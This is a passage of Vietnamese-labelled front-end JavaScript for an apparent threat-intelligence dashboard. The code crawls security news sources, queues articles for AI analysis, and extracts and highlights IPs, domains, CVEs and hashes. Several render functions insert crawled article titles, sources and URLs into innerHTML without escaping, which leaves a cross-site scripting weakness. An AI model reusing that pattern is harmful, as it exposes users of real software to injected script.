          scanToggle.checked = d.auto_scan_enabled;
        }
        const delaySelect = document.getElementById('scanDelayInput');
        if (delaySelect && String(delaySelect.value) !== String(d.scan_interval_sec)) {
          delaySelect.value = String(d.scan_interval_sec);
        }
        const queueToggle = document.getElementById('autoQueueToggle');
        if (queueToggle && queueToggle.checked !== d.auto_queue_enabled) {
          queueToggle.checked = d.auto_queue_enabled;
          autoQueueEnabled = d.auto_queue_enabled;
        }
        const queueStatus = document.getElementById('queueWorkerStatus');
        if (queueStatus) {
          queueStatus.textContent = d.auto_queue_enabled ? 'Bật' : 'Tắt';
          queueStatus.style.color = d.auto_queue_enabled ? 'var(--primary)' : 'var(--text-muted)';
        }

        updateCountdownBadge();

        if (d.is_processing_queue && d.active_article_title) {
          updateLiveTicker(`[Server Tự Động 24/7] Đang xử lý: "${d.active_article_title.slice(0, 50)}..." • ${d.active_stage_name}`);
          const stText = document.getElementById('statusText');
          if (stText) stText.textContent = `Server AI đang xử lý: ${d.active_stage_name}...`;

          const stageIdx = d.active_stage_idx || 2;
          setStageState(stageIdx, 'active', '', '', stageIdx * 20);

          if (d.active_article_id) {
            const actIdx = articles.findIndex(a => a.article_id === d.active_article_id);
            if (actIdx !== -1) {
              articles[actIdx].status = 'processing';
              const cardEl = document.getElementById(`ncard-${actIdx}`);
              if (cardEl) {
                const badgeEl = cardEl.querySelector('.BadgePending, .BadgeCompleted, .BadgeProcessing');
                if (badgeEl) {
                  badgeEl.className = 'BadgeProcessing';
                  badgeEl.textContent = 'Đang xử lý...';
                }
              }
              if (selectedIndices.length === 0) {
                selectCard(actIdx, false);
              }
            }
          }
        }

        if (lastCompletedArticleCount !== -1 && d.completed_count !== lastCompletedArticleCount) {
          await loadArticles(currentFilter, false);
          setStageState(5, 'done', '', '', 100);
          updateLiveTicker(`[Server Tự Động 24/7] Hoàn tất 1 bài báo! Tổng tiến độ: ${d.completed_count}/${d.total_articles} bài (${Math.round((d.completed_count / d.total_articles) * 100)}%).`);
          const stText = document.getElementById('statusText');
          if (stText) stText.textContent = `Server AI: Đã xử lý ${d.completed_count}/${d.total_articles} bài báo. Sẵn sàng nhận lệnh mới.`;
        }
        lastCompletedArticleCount = d.completed_count;
      } catch (e) {
        console.warn("Lỗi sync daemon server:", e);
      }
    }

    async function onScanDelayChange(newVal) {
      const sec = parseInt(newVal, 10);
      serverScanInterval = sec;
      try {
        await fetch('/api/system/daemon-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ scan_interval_sec: sec }),
        });
      } catch (e) {}
      await syncWithServerDaemon();
    }

    async function onAutoScanToggleChange(checked) {
      try {
        await fetch('/api/system/daemon-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ auto_scan_enabled: checked }),
        });
      } catch (e) {}
      await syncWithServerDaemon();
    }

    async function onAutoQueueToggleChange(checked) {
      autoQueueEnabled = checked;
      try {
        await fetch('/api/system/daemon-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ auto_queue_enabled: checked }),
        });
      } catch (e) {}
      await syncWithServerDaemon();
    }

    function resetAutoScanTimer() {
      syncWithServerDaemon();
    }

    function updateCountdownBadge() {
      const badge = document.getElementById('countdownText');
      const pctBadge = document.getElementById('progressPercentText');
      const enabled = document.getElementById('autoScanToggle')?.checked ?? true;
      if (!badge) return;

      if (isServerScanning) {
        badge.textContent = "Đang quét...";
        if (pctBadge) pctBadge.textContent = "Quét...";
        return;
      }

      if (!enabled) {
        badge.textContent = "Tắt";
        if (pctBadge) pctBadge.textContent = "0%";
        return;
      }

      badge.textContent = `${Math.max(0, serverRemainingSec)}s`;
      if (pctBadge && serverScanInterval > 0) {
        const pct = Math.max(0, Math.min(100, Math.round((serverRemainingSec / serverScanInterval) * 100)));
        pctBadge.textContent = `${pct}%`;
      }
    }

    async function triggerAutoScanCrawl() {
      if (isServerScanning) return;
      try {
        updateLiveTicker("Crawler tự động: Yêu cầu server quét 6 nguồn OSINT...");
        await fetch('/api/system/trigger-scan', { method: 'POST' });
        await syncWithServerDaemon();
      } catch (e) {
      }
    }

    function startBackgroundCountdown() {
      if (timerInterval) clearInterval(timerInterval);
      syncWithServerDaemon();

      let tickCount = 0;
      timerInterval = setInterval(async () => {
        tickCount++;
        if (!isServerScanning && serverRemainingSec > 0) {
          serverRemainingSec--;
        }
        updateCountdownBadge();

        if (tickCount % 3 === 0 || serverRemainingSec <= 0) {
          await syncWithServerDaemon();
        }
      }, 1000);
    }

    async function filterBySource(src) {
      currentFilter = src;
      await loadArticles(src, false);
      if (autoQueueEnabled && !isQueueWorkerRunning) {
        triggerNextInQueue();
      }
    }

    async function loadArticles(sourceFilter = 'ALL', autoSelect = false) {
      try {
        const res = await fetch(`/api/articles?source=${encodeURIComponent(sourceFilter)}`);
        const newArticles = await res.json();

        articles = newArticles;
        allHistoryArticles = articles.slice();

        renderSourceWebsites();
        renderNewsGrid();
        renderHistoryManager();
        if (articles.length > 0 && (selectedIndices.length === 0 || !articles[selectedIndices[0]])) {
          const queueIdx = articles.findIndex(a => (a.status || 'pending') === 'processing');
          const pendingIdx = articles.findIndex(a => (a.status || 'pending') === 'pending');
          const pickIdx = queueIdx !== -1 ? queueIdx : (pendingIdx !== -1 ? pendingIdx : 0);
          selectCard(pickIdx, false);
        }
      } catch (err) {
        console.error("Lỗi nạp bài báo:", err);
      }
    }

    function setHistorySort(mode, btnEl) {
      historySortMode = mode;
      ['btnSortRecentDone', 'btnSortNewest', 'btnSortOldest', 'btnSortIoc'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('active');
      });
      if (btnEl) btnEl.classList.add('active');
      renderHistoryManager();
    }

    function renderHistoryManager() {
      const list = (allHistoryArticles && allHistoryArticles.length > 0) ? allHistoryArticles.slice() : articles.slice();
      // 1. Tính toán 4 ô thống kê tổng quan
      const completedArticles = list.filter(a => a.status === 'completed');
      const completedCount = completedArticles.length;
      const processingArticles = list.filter(a => a.status === 'processing');
      const processingCount = processingArticles.length;
      const pendingArticles = list.filter(a => (a.status || 'pending') === 'pending');
      const pendingCount = pendingArticles.length;

      const navCount = document.getElementById('navHistoryCount');
      if (navCount) navCount.textContent = completedCount;

      let compIps = 0, compDoms = 0, compCves = 0, compShas = 0;
      completedArticles.forEach(a => {
        const c = a.ioc_counts || {};
        compIps += (c.ips || 0);
        compDoms += (c.domains || 0);
        compCves += (c.cves || 0);
        compShas += (c.sha256 || 0);
      });
      const compTotalIocs = compIps + compDoms + compCves + compShas;

      const chrono = list.slice().sort((a, b) => (a.sort_ts || '').localeCompare(b.sort_ts || ''));
      const oldestDate = chrono.length > 0 ? (chrono[0].sort_ts || '').slice(0, 10) : '--';
      const newestDate = chrono.length > 0 ? (chrono[chrono.length - 1].sort_ts || '').slice(0, 10) : '--';

      const elTotal = document.getElementById('statTotalArticles');
      const elRange = document.getElementById('statDateRange');
      const elOldNew = document.getElementById('statOldVsNew');
      const elIocs = document.getElementById('statTotalIocs');
      const elIocSub = document.getElementById('statIocBreakdown');

      if (elTotal) elTotal.textContent = `${list.length} bài`;
      if (elRange) elRange.textContent = `${oldestDate} đến ${newestDate}`;
      if (elOldNew) {
        elOldNew.innerHTML = `<span style="color:var(--safe); font-weight:700;">${completedCount} Hoàn thành</span> • <span style="color:var(--text-muted);">${pendingCount} Chờ xử lý</span>${processingCount > 0 ? ` • <span style="color:var(--primary); font-weight:600;">${processingCount} Đang chạy</span>` : ''}`;
      }
      if (elIocs) elIocs.textContent = `${compTotalIocs} chỉ số đã học`;
      if (elIocSub) elIocSub.textContent = `${compIps} IP • ${compDoms} Domain • ${compCves} CVE • ${compShas} Hash (từ ${completedCount}/${list.length} bài)`;

      // 2. Lọc theo Trạng thái, Nguồn, Từ khóa
      const statusFilter = (document.getElementById('historyStatusFilter')?.value) || 'COMPLETED';
      const srcFilter = (document.getElementById('historySourceFilter')?.value) || 'ALL';
      const kw = ((document.getElementById('historySearchInput')?.value) || '').trim().toLowerCase();

      // Đánh số thứ tự gốc từ Cũ Nhất (#01) -> Mới Nhất (#N) để hiển thị rõ tiến trình học
      const chronologicalOrderMap = {};
      chrono.forEach((a, idx) => {
        chronologicalOrderMap[a.article_id] = idx + 1;
      });

      let filtered = list.filter(a => {
        const isDone = (a.status === 'completed');
        if (statusFilter === 'COMPLETED' && !isDone) return false;
        if (statusFilter === 'PENDING' && isDone) return false;
        if (statusFilter === 'HAS_IOC' && ((a.ioc_counts?.total || 0) === 0)) return false;
        if (statusFilter === 'HAS_HASH' && ((a.ioc_counts?.sha256 || 0) === 0)) return false;
        if (statusFilter === 'HAS_IP' && ((a.ioc_counts?.ips || 0) === 0)) return false;
        if (statusFilter === 'HAS_CVE' && ((a.ioc_counts?.cves || 0) === 0)) return false;
        if (srcFilter !== 'ALL' && !a.source.toLowerCase().includes(srcFilter.toLowerCase())) return false;
        if (kw) {
          const hay = `${a.title} ${a.source} ${a.published_at} ${a.content}`.toLowerCase();
          if (!hay.includes(kw)) return false;
        }
        return true;
      });

      // 3. Sắp xếp theo chế độ đang chọn
      if (historySortMode === 'RECENT_DONE') {
        filtered.sort((a, b) => {
          const timeA = a.last_analyzed_at || '';
          const timeB = b.last_analyzed_at || '';
          if (timeA && timeB) return timeB.localeCompare(timeA);
          if (timeA && !timeB) return -1;
          if (!timeA && timeB) return 1;
          return (b.sort_ts || '').localeCompare(a.sort_ts || '');
        });
      } else if (historySortMode === 'OLDEST') {
        filtered.sort((a, b) => (a.sort_ts || '').localeCompare(b.sort_ts || ''));
      } else if (historySortMode === 'NEWEST') {
        filtered.sort((a, b) => (b.sort_ts || '').localeCompare(a.sort_ts || ''));
      } else if (historySortMode === 'IOC_DESC') {
        filtered.sort((a, b) => ((b.ioc_counts?.total || 0) - (a.ioc_counts?.total || 0)) || (a.sort_ts || '').localeCompare(b.sort_ts || ''));
      }

      const selCountEl = document.getElementById('histSelectedCount');
      if (selCountEl) selCountEl.textContent = selectedHistoryIds.size;

      const tbody = document.getElementById('historyTableBody');
      if (!tbody) return;
      if (filtered.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="color:var(--text-muted); text-align:center; padding:18px;">Không tìm thấy bài báo nào khớp bộ lọc.</td></tr>`;
        return;
      }

      const MAX_RENDER = 100;
      const toShow = filtered.slice(0, MAX_RENDER);
      const moreCount = filtered.length - MAX_RENDER;
      const moreNotice = moreCount > 0
        ? `<tr><td colspan="6" style="padding:14px; text-align:center; background:var(--bg-subtle); color:var(--text-muted); font-size:12px;">
            Đang hiển thị 100 bài tiêu biểu nhất trên tổng số <b>${filtered.length.toLocaleString()}</b> bài trong kho SQLite. Dùng thanh tìm kiếm hoặc bộ lọc để tra cứu tức thì bất kỳ bài nào!
          </td></tr>`
        : '';

      tbody.innerHTML = toShow.map(art => {
        const seqNum = String(chronologicalOrderMap[art.article_id] || 1).padStart(2, '0');
        const checked = selectedHistoryIds.has(art.article_id) ? 'checked' : '';
        const pubDateStr = formatToLocalTime(art.sort_ts || art.published_at);
        const fetchedDateStr = formatToLocalTime(art.fetched_at || art.sort_ts);
        const isDone = (art.status === 'completed');
        const durStr = art.processing_time_sec ? ` (${art.processing_time_sec.toFixed(1)}s)` : '';
        const analyzedStr = art.last_analyzed_at ? `<div style="font-size:11px; color:var(--safe); font-family:var(--font-mono); margin-top:2px;">Xong: ${art.last_analyzed_at.slice(11, 19)}</div>` : '';
        const statusBadge = isDone
          ? `<span class="BadgeCompleted">Hoàn thành${durStr}</span>${analyzedStr}`
          : (art.status === 'processing'
            ? `<span class="BadgeProcessing">Đang xử lý...</span>`
            : `<span class="BadgePending">Chờ xử lý</span>`);

        const c = art.ioc_counts || {};
        const chips = [];
        (c.sample_shas || []).forEach(sh => chips.push(`<span class="IocChip hash">SHA: ${sh.slice(0, 8)}...</span>`));
        (c.sample_ips || []).forEach(ip => {
          const clean = (ip || '').replace(/\[\.\]/g, '.').replace(/\(\.\)/g, '.').trim();
          if (clean.startsWith('127.') || clean.startsWith('0.') || clean.startsWith('169.254.') || clean === '255.255.255.255') {
            return;
          }
          if (clean.startsWith('10.') || clean.startsWith('192.168.') || /^172\.(1[6-9]|2\d|3[0-1])\./.test(clean)) {
            chips.push(`<span class="IocChip ip-internal" title="Địa chỉ IP nội bộ mạng LAN (RFC1918)">LAN: ${ip}</span>`);
          } else if (['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1'].includes(clean)) {
            chips.push(`<span class="IocChip ip-safe" title="Public DNS an toàn">DNS: ${ip}</span>`);
          } else {
            chips.push(`<span class="IocChip ip" title="C2 / IP ngoại mạng">IP: ${ip}</span>`);
          }
        });
        (c.sample_cves || []).forEach(cv => chips.push(`<span class="IocChip cve">${cv}</span>`));
        (c.sample_domains || []).forEach(dm => chips.push(`<span class="IocChip dom">${dm}</span>`));

        const summaryCounts = [];
        if (c.ips > 0) summaryCounts.push(`<b>${c.ips}</b> IP`);
        if (c.domains > 0) summaryCounts.push(`<b>${c.domains}</b> Domain`);
        if (c.cves > 0) summaryCounts.push(`<b>${c.cves}</b> CVE`);
        if (c.sha256 > 0) summaryCounts.push(`<b>${c.sha256}</b> Hash`);

        const iocCellHtml = summaryCounts.length > 0
          ? `<div style="font-size:11.5px; margin-bottom:4px; color:var(--primary);">${summaryCounts.join(' &bull; ')}</div><div>${chips.slice(0, 4).join('')}</div>`
          : `<span style="color:var(--text-muted); font-size:12px;">Báo cáo ngữ cảnh chung</span>`;

        const safeTitle = (art.title || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        const charLen = (art.content || '').length.toLocaleString('vi-VN');

        return `
          <tr>
            <td class="mono">
              <label style="cursor:pointer; display:flex; align-items:center; gap:6px;">
                <input type="checkbox" ${checked} onchange="toggleHistoryCheckbox('${art.article_id}', this.checked)" />
                <b style="color:var(--primary);">#${seqNum}</b>
              </label>
            </td>
            <td>
              <div class="mono" style="font-size:11.5px; color:var(--text-main); margin-bottom:2px;" title="Ngày xuất bản bài báo gốc">
                <span style="color:var(--text-muted);">Đăng:</span> ${pubDateStr || '--'}
              </div>
              <div class="mono" style="font-size:11px; color:var(--primary); margin-bottom:5px;" title="Thời điểm crawler quét và nạp vào hệ thống">
                <span style="color:var(--text-muted);">Quét:</span> ${fetchedDateStr || '--'}
              </div>
              ${statusBadge}
            </td>
            <td>
              <div style="font-weight:600; color:var(--text-main); margin-bottom:4px;">${art.source}</div>
              <a class="BtnMiniProof" href="${art.url}" target="_blank">Báo gốc &nearr;</a>
            </td>
            <td>
              <div style="font-weight:600; color:var(--text-main); cursor:pointer; line-height:1.4;" onclick="viewArticleById('${art.article_id}', false)" title="Nhấn để đọc văn bản nguyên bản">
                ${safeTitle}
              </div>
              <div style="font-size:11.5px; color:var(--text-muted); margin-top:3px;">
                Độ dài: ${charLen} ký tự &bull; Mã: <span class="mono">${art.article_id}</span>
              </div>
            </td>
            <td>${iocCellHtml}</td>
            <td>
              <div style="display:flex; gap:5px; flex-wrap:wrap;">
                <button class="BtnMiniProof" onclick="viewArticleById('${art.article_id}', false)">Xem</button>
                <button class="BtnMiniProof" style="border-color:var(--primary); color:var(--primary);" onclick="viewArticleById('${art.article_id}', true)">Chạy AI</button>
                <button class="BtnMiniProof" style="border-color:var(--danger-border); color:var(--danger);" onclick="deleteArticleFromHistory('${art.article_id}')">Xóa</button>
              </div>
            </td>
          </tr>
        `;
      }).join('') + moreNotice;
    }

    function toggleHistoryCheckbox(articleId, isChecked) {
      if (isChecked) {
        selectedHistoryIds.add(articleId);
      } else {
        selectedHistoryIds.delete(articleId);
      }
      const selCountEl = document.getElementById('histSelectedCount');
      if (selCountEl) selCountEl.textContent = selectedHistoryIds.size;
    }

    function toggleSelectAllHistory(isChecked) {
      const list = (allHistoryArticles && allHistoryArticles.length > 0) ? allHistoryArticles : articles;
      if (isChecked) {
        list.forEach(a => selectedHistoryIds.add(a.article_id));
      } else {
        selectedHistoryIds.clear();
      }
      renderHistoryManager();
    }

    function viewArticleById(articleId, autoRunAi = false) {
      const list = (allHistoryArticles && allHistoryArticles.length > 0) ? allHistoryArticles : articles;
      const foundIdx = articles.findIndex(a => a.article_id === articleId);
      if (foundIdx >= 0) {
        selectCard(foundIdx, autoRunAi);
      } else {
        const foundArt = list.find(a => a.article_id === articleId);
        if (!foundArt) return;
        articles.unshift(foundArt);
        renderNewsGrid();
        selectCard(0, autoRunAi);
      }
      const viewer = document.getElementById('sec-feed');
      if (viewer && viewer.style.display !== 'none') {
        viewer.scrollIntoView({ behavior: 'smooth', block: 'start' });
      } else {
        switchView('all', document.querySelector('.NavLinks .NavLink'));
        setTimeout(() => {
          document.getElementById('sec-feed')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }, 100);
      }
    }

    function analyzeSelectedHistoryArticles() {
      const list = (allHistoryArticles && allHistoryArticles.length > 0) ? allHistoryArticles : articles;
      const chosen = list.filter(a => selectedHistoryIds.has(a.article_id));
      if (chosen.length === 0) {
        alert("Vui lòng tích chọn ít nhất 1 bài báo trong bảng Lịch Sử để chạy phân tích!");
        return;
      }
      currentTitle = `[Gộp ${chosen.length} Bài Từ Lịch Sử] ` + chosen.map(a => a.source).join(', ');
      document.getElementById('articleText').value = chosen.map((a, i) =>
        `=== [BÀI BÁO LỊCH SỬ #${i + 1} - ${a.source} (${a.published_at})]: ${a.title} ===\n${a.content}`
      ).join('\n\n');
      renderHighlightedArticlesAndBuildProvenance(chosen.map((art, idx) => ({ art, idx })));
      switchView('all', document.querySelector('.NavLinks .NavLink'));
      document.getElementById('sec-score')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      runPipeline();
    }

    async function toggleArticleHistoricalStatus(articleId) {
      try {
        const res = await fetch('/api/articles/toggle-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ article_id: articleId })
        });
        const data = await res.json();
        allHistoryArticles = data.articles || [];
        articles = allHistoryArticles.slice();
        renderNewsGrid();
        renderHistoryManager();
      } catch (e) {
        alert("Lỗi đổi trạng thái: " + e);
      }
    }

    async function deleteArticleFromHistory(articleId) {
      try {
        const res = await fetch('/api/articles/delete', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ article_id: articleId })
        });
        const data = await res.json();
        selectedHistoryIds.delete(articleId);
        allHistoryArticles = data.articles || [];
        articles = allHistoryArticles.slice();
        renderNewsGrid();
        renderHistoryManager();
      } catch (e) {
        alert("Lỗi xóa bài báo: " + e);
      }
    }

    async function triggerManualRefreshHistory(btnEl) {
      if (btnEl) {
        btnEl.disabled = true;
        btnEl.textContent = "Đang quét 6 nguồn...";
      }
      updateLiveTicker("Crawler: Đang tự động quét 6 nguồn OSINT quốc tế (TheHackerNews, CISA KEV, Securelist...)...");
      try {
        await fetch('/api/articles/refresh', { method: 'POST' });
        await loadArticles(currentFilter, false);
        updateLiveTicker("Crawler: Đã hoàn tất quét và đồng bộ dữ liệu mới vào kho tri thức SQLite.");
      } finally {
        if (btnEl) {
          btnEl.disabled = false;
          btnEl.textContent = "Quét Thêm Báo";
        }
      }
    }

    async function triggerCrawlYtd(btnEl) {
      if (btnEl) {
        btnEl.disabled = true;
        btnEl.textContent = "Đang quét dữ liệu 2026...";
      }
      updateLiveTicker("YTD Crawler: Đang quét toàn diện các nguồn OSINT quốc tế từ đầu năm 2026 (TheHackerNews, CISA KEV, Securelist, SentinelOne, DFIR Report)...");
      try {
        const res = await fetch('/api/articles/crawl-ytd?since=2026-01-01', { method: 'POST' });
        const result = await res.json();
        await loadArticles(currentFilter, false);
        const addedCount = result.collected_in_batch || 0;
        const totalCount = result.total_articles_in_db || 0;
        updateLiveTicker(`YTD Crawler: Hoàn tất quét. Đã nạp ${addedCount} bài từ năm 2026. Tổng kho tri thức hiện có: ${totalCount} bài.`);
      } catch (e) {
        alert("Lỗi quét dữ liệu 2026: " + e);
        updateLiveTicker("YTD Crawler: Gặp sự cố kết nối khi quét bổ sung dữ liệu.");
      } finally {
        if (btnEl) {
          btnEl.disabled = false;
          btnEl.textContent = "Quét Bổ Sung Dữ Liệu 2026";
        }
      }
    }

    function updateLiveTicker(msg) {
      const el = document.getElementById('liveTickerText');
      const timeEl = document.getElementById('liveTickerTime');
      if (el) el.textContent = msg;
      if (timeEl) {
        const now = new Date();
        timeEl.textContent = now.toTimeString().slice(0, 8);
      }
    }

    function renderNewsGrid() {
      const grid = document.getElementById('newsGrid');
      const statusFilterVal = (document.getElementById('feedStatusFilter')?.value) || 'QUEUE';
      let displayedArticles = articles.slice();
      if (statusFilterVal === 'QUEUE') {
        displayedArticles = displayedArticles.filter(a => {
          const st = a.status || 'pending';
          return st === 'pending' || st === 'processing';
        });
      } else if (statusFilterVal !== 'ALL') {
        displayedArticles = displayedArticles.filter(a => (a.status || 'pending') === statusFilterVal);
      }
      if (displayedArticles.length === 0) {
        grid.innerHTML = `<div style="padding:22px; text-align:center; color:var(--text-muted); font-size:13px; line-height:1.6;">
          <div style="font-weight:600; color:var(--primary); margin-bottom:6px;">HÀNG ĐỢI LIVE TRỐNG</div>
          Tất cả bài báo trong đợt quét đã được xử lý xong và lưu trữ trong mục <b>Lịch Sử</b> bên dưới.
        </div>`;
        return;
      }
      const MAX_FEED = 50;
      const feedToShow = displayedArticles.slice(0, MAX_FEED);
      grid.innerHTML = feedToShow.map((art) => {
        const idx = articles.indexOf(art);
        const isSel = selectedIndices.includes(idx) ? 'selected' : '';
        const counts = art.ioc_counts || { ips: 0, domains: 0, cves: 0, sha256: 0, total: 0 };
        const badgeParts = [];
        if (counts.ips > 0) badgeParts.push(`${counts.ips} IP`);
        if (counts.domains > 0) badgeParts.push(`${counts.domains} Domain`);
        if (counts.cves > 0) badgeParts.push(`${counts.cves} CVE`);
        if (counts.sha256 > 0) badgeParts.push(`${counts.sha256} Hash`);
        const iocBadge = badgeParts.length > 0 ? badgeParts.join(' · ') : 'CTI';

        const st = art.status || 'pending';
        let statusBadgeHtml = '';
        if (st === 'processing') {
          statusBadgeHtml = `<span class="BadgeProcessing">Đang xử lý...</span>`;
        } else if (st === 'completed') {
          const dur = art.processing_time_sec ? `${art.processing_time_sec.toFixed(1)}s` : 'Xong';
          statusBadgeHtml = `<span class="BadgeCompleted">Đã xử lý (${dur})</span>`;
        } else {
          statusBadgeHtml = `<span class="BadgePending">Chờ xử lý</span>`;
        }

        const pubDateStr = formatToLocalTime(art.sort_ts || art.published_at);
        const fetchedDateStr = formatToLocalTime(art.fetched_at || art.sort_ts);

        return `
          <div class="FeedItem ${isSel}" id="ncard-${idx}" onclick="selectCard(${idx}, false)">
            <div class="FeedMeta">
              <span class="FeedSource">#${idx + 1} &bull; ${art.source}</span>
              <span>${iocBadge}</span>
            </div>
            <div class="FeedTitle">${art.title}</div>
            <div class="FeedFootMeta" style="flex-wrap: wrap; gap: 4px;">
              <span title="Thời gian xuất bản gốc (Giờ Việt Nam GMT+7)"><span style="color:var(--text-muted);">Đăng:</span> <span class="mono">${pubDateStr || '--'}</span></span>
              <span title="Thời điểm crawler quét nạp về hệ thống (Giờ Việt Nam GMT+7)"><span style="color:var(--text-muted);">Quét:</span> <span class="mono" style="color:var(--primary);">${fetchedDateStr || '--'}</span></span>
              <div style="margin-left: auto;">${statusBadgeHtml}</div>
            </div>
          </div>
        `;
      }).join('');
    }

    function renderHighlightedArticlesAndBuildProvenance(selectedArts) {
      iocProvenanceMap = {};
      const ipRegex = /\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\[\.\]|\(\.\)|\.)){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b/g;
      const domRegex = /\b(?:[a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+(?:\[\.\]|\(\.\))(?:com|net|org|io|ru|cn|xyz|top|info|biz|cc|pw|club|online|site|tech|gov|edu|tw|ua|pl|ro|ca|uk|ae|la|bet|wiki)\b/gi;
      const cveRegex = /\bCVE-\d{4}-\d{4,7}\b/gi;
      const shaRegex = /\b[a-fA-F0-9]{64}\b/g;

      const htmlBlocks = selectedArts.map(({ art, idx }) => {
        const rawIps = [];
        let ipMatch;
        ipRegex.lastIndex = 0;
        while ((ipMatch = ipRegex.exec(art.content)) !== null) {
          if (isValidIpv4Token(ipMatch[0], art.content, ipMatch.index)) {
            rawIps.push(ipMatch[0]);
          }
        }
        rawIps.forEach(rawIp => {
          const clean = cleanRefang(rawIp);
          const isSafe = isBenignOrProtectedIoc(rawIp);
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawIp),
              rawToken: rawIp,
              role: isSafe ? 'IP2 • An toàn' : 'IP1 • Tấn công / C2'
            };
          }
        });

        const rawDoms = art.content.match(domRegex) || [];
        rawDoms.forEach(rawDom => {
          const clean = cleanRefang(rawDom).toLowerCase();
          const isSafe = isBenignOrProtectedIoc(rawDom);
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawDom),
              rawToken: rawDom,
              role: isSafe ? 'Tên miền Hợp pháp' : 'Tên miền C2'
            };
          }
        });

        const rawCves = art.content.match(cveRegex) || [];
        rawCves.forEach(rawCve => {
          const clean = rawCve.toUpperCase();
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawCve),
              rawToken: rawCve,
              role: 'Lỗ hổng CVE'
            };
          }
        });

        const rawShas = art.content.match(shaRegex) || [];
        rawShas.forEach(rawSha => {
          const clean = rawSha.toLowerCase();
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawSha),
              rawToken: rawSha,
              role: 'Mã băm SHA256'
            };
          }
        });

        const md5Regex = /\b[a-fA-F0-9]{32}\b/g;
        const rawMds = art.content.match(md5Regex) || [];
        rawMds.forEach(rawMd => {
          const clean = rawMd.toLowerCase();
          if (!iocProvenanceMap[clean]) {
            iocProvenanceMap[clean] = {
              articleIdx: idx,
              source: art.source,
              title: art.title,
              url: art.url,
              proofUrl: buildTextFragmentUrl(art.url, rawMd),
              rawToken: rawMd,
              role: 'Mã băm MD5'
            };
          }
        });

        const paragraphs = art.content.split(/\n+/).filter(p => p.trim().length > 0);
        const renderedParas = paragraphs.map(p => {
          let hasValidIp = false;
          let pIpMatch;
          ipRegex.lastIndex = 0;
          while ((pIpMatch = ipRegex.exec(p)) !== null) {
            if (isValidIpv4Token(pIpMatch[0], p, pIpMatch.index)) {
              hasValidIp = true;
              break;
            }
          }
          const hasIoc =
            hasValidIp ||
            domRegex.test(p) ||
            cveRegex.test(p) ||
            shaRegex.test(p) ||
            md5Regex.test(p);
          domRegex.lastIndex = 0;
          cveRegex.lastIndex = 0;
          shaRegex.lastIndex = 0;
          md5Regex.lastIndex = 0;

          let safeP = p.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

          safeP = safeP.replace(cveRegex, (m) => `<span class="HlCve" id="${domSafeId(m.toUpperCase())}">${m}</span>`);
          safeP = safeP.replace(shaRegex, (m) => `<span class="HlHash" id="${domSafeId(m.toLowerCase())}">${m}</span>`);
          safeP = safeP.replace(md5Regex, (m) => `<span class="HlHash" id="${domSafeId(m.toLowerCase())}">${m}</span>`);
          safeP = safeP.replace(domRegex, (m) => {
            const clean = cleanRefang(m).toLowerCase();
            if (ipRegex.test(clean)) { ipRegex.lastIndex = 0; return m; }
            ipRegex.lastIndex = 0;
            return `<span class="${isBenignOrProtectedIoc(m) ? 'HlIp2' : 'HlIp1'}" id="${domSafeId(clean)}">${m}</span>`;
          });
          safeP = safeP.replace(ipRegex, (m, offset, fullStr) => {
            if (!isValidIpv4Token(m, fullStr, offset)) return m;
            return `<span class="${isBenignOrProtectedIoc(m) ? 'HlIp2' : 'HlIp1'}" id="${domSafeId(cleanRefang(m))}">${m}</span>`;
          });

          return hasIoc ? `<div class="HlSentence">${safeP}</div>` : `<div style="margin:6px 0; color:var(--text-muted);">${safeP}</div>`;
        }).join('');

        const st = art.status || 'pending';
        let statusBadgeHtml = '';
        if (st === 'processing') {
          statusBadgeHtml = `<span class="BadgeProcessing">Đang xử lý...</span>`;
        } else if (st === 'completed') {
          const dur = art.processing_time_sec ? `${art.processing_time_sec.toFixed(1)}s` : 'Xong';
          statusBadgeHtml = `<span class="BadgeCompleted">Đã xử lý (${dur})</span>`;
        } else {
          statusBadgeHtml = `<span class="BadgePending">Chờ xử lý</span>`;
        }
        const pubTime = formatToLocalTime(art.sort_ts || art.published_at);
        const displayTime = formatToLocalTime(art.fetched_at || art.sort_ts);

        return `
          <div style="margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid var(--border-main);" id="art-evidence-${idx}">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; gap:8px;">
              <b style="color:var(--text-main); font-size:13.5px;">#${idx + 1} [${art.source}] ${art.title}</b>
              <a class="BtnMiniProof" href="${art.url}" target="_blank">Báo gốc &nearr;</a>
            </div>
            <div style="display:flex; align-items:center; gap:12px; margin-bottom:10px; font-size:11.5px; color:var(--text-muted); flex-wrap:wrap;">
              <span>Xuất bản: <b style="color:var(--text-main); font-family:var(--font-mono);">${pubTime}</b></span>
              <span>Quét về: <b style="color:var(--primary); font-family:var(--font-mono);">${displayTime}</b></span>
